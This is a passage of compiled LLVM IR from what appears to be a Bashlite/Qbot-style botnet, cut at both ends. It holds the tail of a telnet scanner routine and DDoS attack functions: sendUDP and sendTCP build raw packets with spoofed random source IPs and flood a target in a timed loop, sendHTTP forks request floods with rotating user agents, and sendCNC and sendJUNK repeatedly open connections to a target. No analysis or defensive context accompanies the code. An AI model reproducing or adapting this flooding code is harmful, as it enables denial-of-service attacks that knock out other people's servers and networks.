  %385 = load i32, i32* %340, align 16
  %386 = call i32 @sclose(i32 %385)
  store i8 0, i8* %40, align 8
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %387, align 1
  br label %388

; <label>:388:                                    ; preds = %.lr.ph, %200, %277, %332, %92, %89, %139, %134, %174, %166, %251, %244, %319, %311, %372, %352, %68, %346, %328, %309, %305, %298, %273, %267, %240, %217, %196, %190, %164, %123, %67
  %389 = add nsw i32 %.1163, 1
  %390 = icmp slt i32 %389, %11
  %brmerge = or i1 %390, %30
  %.mux = select i1 %390, i32 %389, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %388
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %114

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %114, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #3
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %114, label %.preheader.preheader

.preheader.preheader:                             ; preds = %27
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.04041 = phi i32 [ %31, %.preheader ], [ 50, %.preheader.preheader ]
  %31 = add nsw i32 %.04041, -1
  %32 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %33 = call i32 @rand_cmwc()
  %34 = xor i32 %33, %32
  call void @srand(i32 %34) #3
  %35 = call i32 @rand() #3
  call void @init_rand(i32 %35)
  %36 = icmp eq i32 %31, 0
  br i1 %36, label %37, label %.preheader

; <label>:37:                                     ; preds = %.preheader
  %38 = sub nsw i32 32, %5
  %39 = shl i32 -1, %38
  %40 = sext i32 %3 to i64
  %41 = add nsw i64 %40, 28
  %42 = call i8* @llvm.stacksave()
  %43 = alloca i8, i64 %41, align 16
  %44 = bitcast i8* %43 to %struct.iphdr*
  %45 = getelementptr i8, i8* %43, i64 20
  %46 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @getRandomIP(i32 %39)
  %49 = call i32 @htonl(i32 %48) #18
  %50 = add nsw i64 %40, 8
  %51 = trunc i64 %50 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %44, i32 %47, i32 %49, i8 zeroext 17, i32 %51)
  %52 = trunc i64 %50 to i16
  %53 = call zeroext i16 @htons(i16 zeroext %52) #18
  %54 = getelementptr inbounds i8, i8* %43, i64 24
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 8
  %56 = call i32 @rand_cmwc()
  %57 = trunc i32 %56 to i16
  %58 = bitcast i8* %45 to i16*
  store i16 %57, i16* %58, align 4
  br i1 %10, label %59, label %61

; <label>:59:                                     ; preds = %37
  %60 = call i32 @rand_cmwc()
  br label %65

; <label>:61:                                     ; preds = %37
  %62 = trunc i32 %1 to i16
  %63 = call zeroext i16 @htons(i16 zeroext %62) #18
  %64 = zext i16 %63 to i32
  br label %65

; <label>:65:                                     ; preds = %61, %59
  %66 = phi i32 [ %60, %59 ], [ %64, %61 ]
  %67 = trunc i32 %66 to i16
  %68 = getelementptr inbounds i8, i8* %43, i64 22
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 2
  %70 = getelementptr inbounds i8, i8* %43, i64 26
  %71 = bitcast i8* %70 to i16*
  store i16 0, i16* %71, align 2
  %72 = getelementptr inbounds i8, i8* %43, i64 28
  call void @makeRandomStr(i8* %72, i32 %3)
  %73 = bitcast i8* %43 to i16*
  %74 = getelementptr inbounds i8, i8* %43, i64 2
  %75 = bitcast i8* %74 to i16*
  %76 = load i16, i16* %75, align 2
  %77 = zext i16 %76 to i32
  %78 = call zeroext i16 @csum(i16* nonnull %73, i32 %77)
  %79 = getelementptr inbounds i8, i8* %43, i64 10
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  %81 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %82 = add nsw i32 %81, %2
  %83 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %84 = getelementptr inbounds i8, i8* %43, i64 4
  %85 = bitcast i8* %84 to i16*
  %86 = getelementptr inbounds i8, i8* %43, i64 12
  %87 = bitcast i8* %86 to i32*
  %88 = trunc i32 %1 to i16
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %65
  %.0 = phi i32 [ 0, %65 ], [ %.0.be, %.backedge.backedge ]
  %89 = call i64 @sendto(i32 %25, i8* nonnull %43, i64 %41, i32 0, %struct.sockaddr* nonnull %83, i32 16) #3
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  store i16 %91, i16* %58, align 4
  br i1 %10, label %92, label %94

; <label>:92:                                     ; preds = %.backedge
  %93 = call i32 @rand_cmwc()
  br label %97

; <label>:94:                                     ; preds = %.backedge
  %95 = call zeroext i16 @htons(i16 zeroext %88) #18
  %96 = zext i16 %95 to i32
  br label %97

; <label>:97:                                     ; preds = %94, %92
  %98 = phi i32 [ %93, %92 ], [ %96, %94 ]
  %99 = trunc i32 %98 to i16
  store i16 %99, i16* %69, align 2
  %100 = call i32 @rand_cmwc()
  %101 = trunc i32 %100 to i16
  store i16 %101, i16* %85, align 4
  %102 = call i32 @getRandomIP(i32 %39)
  %103 = call i32 @htonl(i32 %102) #18
  store i32 %103, i32* %87, align 4
  %104 = load i16, i16* %75, align 2
  %105 = zext i16 %104 to i32
  %106 = call zeroext i16 @csum(i16* nonnull %73, i32 %105)
  store i16 %106, i16* %80, align 2
  %107 = icmp eq i32 %.0, %4
  br i1 %107, label %108, label %111

; <label>:108:                                    ; preds = %97
  %109 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %110 = icmp sgt i32 %109, %82
  br i1 %110, label %113, label %.backedge.backedge

; <label>:111:                                    ; preds = %97
  %112 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %111, %108
  %.0.be = phi i32 [ %112, %111 ], [ 0, %108 ]
  br label %.backedge

; <label>:113:                                    ; preds = %108
  call void @llvm.stackrestore(i8* %42)
  br label %114

; <label>:114:                                    ; preds = %22, %17, %27, %113
  ret void
}

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #3
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #3
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %10 = add nsw i32 %9, %4
  %11 = icmp sgt i32 %5, 0
  br i1 %11, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %12 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %15

; <label>:13:                                     ; preds = %15
  %14 = icmp slt i32 %24, %5
  br i1 %14, label %15, label %._crit_edge16.loopexit

; <label>:15:                                     ; preds = %.lr.ph15, %13
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %24, %13 ]
  %16 = tail call i32 @rand() #3
  %17 = srem i32 %16, 36
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [36 x i8*], [36 x i8*]* @uastrings, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %12, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.82, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %20) #3
  %22 = tail call i32 @fork() #3
  %23 = icmp eq i32 %22, 0
  %24 = add nuw nsw i32 %.013, 1
  br i1 %23, label %13, label %.preheader

.preheader:                                       ; preds = %15
  %25 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %26 = icmp sgt i32 %10, %25
  br i1 %26, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %27 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %28

; <label>:28:                                     ; preds = %.lr.ph, %.backedge
  %29 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %.backedge, label %31

; <label>:31:                                     ; preds = %28
  %32 = call i64 @strlen(i8* nonnull %12) #15
  %33 = call i64 @write(i32 %29, i8* nonnull %12, i64 %32) #3
  %34 = call i64 @read(i32 %29, i8* nonnull %27, i64 1) #3
  %35 = tail call i32 @close(i32 %29) #3
  br label %.backedge

.backedge:                                        ; preds = %31, %28
  %36 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %37 = icmp sgt i32 %10, %36
  br i1 %37, label %28, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #17
  unreachable

._crit_edge16.loopexit:                           ; preds = %13
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %6 = add nsw i32 %5, %2
  %7 = tail call i32 @inet_addr(i8* %0) #3
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %7, i32* %8, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = trunc i32 %1 to i16
  %11 = tail call zeroext i16 @htons(i16 zeroext %10) #18
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %11, i16* %12, align 2
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = icmp sgt i32 %6, %13
  br i1 %14, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %15 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %16

; <label>:16:                                     ; preds = %.lr.ph, %16
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %18 = call i32 @connect(i32 %17, %struct.sockaddr* nonnull %15, i32 16) #3
  %19 = call i32 @sleep(i32 1) #3
  %20 = call i32 @close(i32 %17) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = icmp sgt i32 %6, %21
  br i1 %22, label %16, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %16
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i8*, i32, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %142

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %142, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #3
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %142, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %6, 0
  %34 = sub nsw i32 32, %6
  %35 = shl i32 -1, %34
  %.074 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %4 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.074)
  %46 = call i32 @htonl(i32 %45) #18
  %47 = add i32 %4, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i64 0, i64 0)) #15
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %.preheader

.preheader:                                       ; preds = %32
  %63 = call i8* @strtok(i8* %3, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %64 = icmp eq i8* %63, null
  br i1 %64, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:65:                                     ; preds = %32
  %66 = and i16 %58, -8177
  %67 = or i16 %66, 8016
  store i16 %67, i16* %57, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge77
  %68 = phi i8* [ %83, %.backedge77 ], [ %63, %.lr.ph.preheader ]
  %69 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i64 0, i64 0)) #15
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.sink.split, label %71

; <label>:71:                                     ; preds = %.lr.ph
  %72 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0)) #15
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.sink.split, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %.sink.split, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i64 0, i64 0)) #15
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.sink.split, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %.backedge77

.backedge77:                                      ; preds = %80, %.sink.split
  %83 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %84 = icmp eq i8* %83, null
  br i1 %84, label %.loopexit.loopexit, label %.lr.ph

.sink.split:                                      ; preds = %80, %77, %74, %71, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %71 ], [ -257, %74 ], [ -4097, %77 ], [ -2049, %80 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %71 ], [ 256, %74 ], [ 4096, %77 ], [ 2048, %80 ]
  %85 = load i16, i16* %57, align 16
  %86 = and i16 %85, %.sink7
  %87 = or i16 %86, %.sink5
  store i16 %87, i16* %57, align 16
  br label %.backedge77

.loopexit.loopexit:                               ; preds = %.backedge77
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %65
  %88 = call i32 @rand_cmwc()
  %89 = trunc i32 %88 to i16
  %90 = getelementptr inbounds i8, i8* %39, i64 34
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = getelementptr inbounds i8, i8* %39, i64 36
  %93 = bitcast i8* %92 to i16*
  store i16 0, i16* %93, align 4
  %94 = getelementptr inbounds i8, i8* %39, i64 38
  %95 = bitcast i8* %94 to i16*
  store i16 0, i16* %95, align 2
  br i1 %11, label %96, label %98

; <label>:96:                                     ; preds = %.loopexit
  %97 = call i32 @rand_cmwc()
  br label %102

; <label>:98:                                     ; preds = %.loopexit
  %99 = trunc i32 %1 to i16
  %100 = call zeroext i16 @htons(i16 zeroext %99) #18
  %101 = zext i16 %100 to i32
  br label %102

; <label>:102:                                    ; preds = %98, %96
  %103 = phi i32 [ %97, %96 ], [ %101, %98 ]
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds i8, i8* %39, i64 22
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %107, i16* %93, align 4
  %108 = bitcast i8* %39 to i16*
  %109 = getelementptr inbounds i8, i8* %39, i64 2
  %110 = bitcast i8* %109 to i16*
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* nonnull %108, i32 %112)
  %114 = getelementptr inbounds i8, i8* %39, i64 10
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %117 = add nsw i32 %116, %2
  %118 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %119 = getelementptr inbounds i8, i8* %39, i64 12
  %120 = bitcast i8* %119 to i32*
  %121 = getelementptr inbounds i8, i8* %39, i64 4
  %122 = bitcast i8* %121 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %102
  %.0 = phi i32 [ 0, %102 ], [ %.0.be, %.backedge.backedge ]
  %123 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %118, i32 16) #3
  %124 = call i32 @getRandomIP(i32 %.074)
  %125 = call i32 @htonl(i32 %124) #18
  store i32 %125, i32* %120, align 4
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %122, align 4
  %128 = call i32 @rand_cmwc()
  store i32 %128, i32* %53, align 8
  %129 = call i32 @rand_cmwc()
  %130 = trunc i32 %129 to i16
  store i16 %130, i16* %50, align 4
  store i16 0, i16* %93, align 4
  %131 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %131, i16* %93, align 4
  %132 = load i16, i16* %110, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %108, i32 %133)
  store i16 %134, i16* %115, align 2
  %135 = icmp eq i32 %.0, %5
  br i1 %135, label %136, label %139

; <label>:136:                                    ; preds = %.backedge
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = icmp sgt i32 %137, %117
  br i1 %138, label %141, label %.backedge.backedge

; <label>:139:                                    ; preds = %.backedge
  %140 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %139, %136
  %.0.be = phi i32 [ %140, %139 ], [ 0, %136 ]
  br label %.backedge

; <label>:141:                                    ; preds = %136
  call void @llvm.stackrestore(i8* %38)
  br label %142

; <label>:142:                                    ; preds = %23, %18, %28, %141
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %101

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call noalias i8* @malloc(i64 1024) #3
  tail call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 1024, i32 1, i1 false)
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %29 = add nsw i32 %28, %2
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %31 = icmp sgt i32 %29, %30
  br i1 %31, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %32 = icmp sgt i32 %9, 1
  %33 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %34 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %37 = bitcast i32* %8 to i8*
  %38 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %99
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %40 = icmp sgt i32 %29, %39
  br i1 %40, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %32, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %99
  %indvars.iv = phi i64 [ %indvars.iv.next, %99 ], [ 0, %.lr.ph.preheader ]
  %41 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %43 = load i8, i8* %42, align 4
  switch i8 %43, label %99 [
    i8 0, label %44
    i8 1, label %60
    i8 2, label %87
  ]

; <label>:44:                                     ; preds = %.lr.ph
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #3
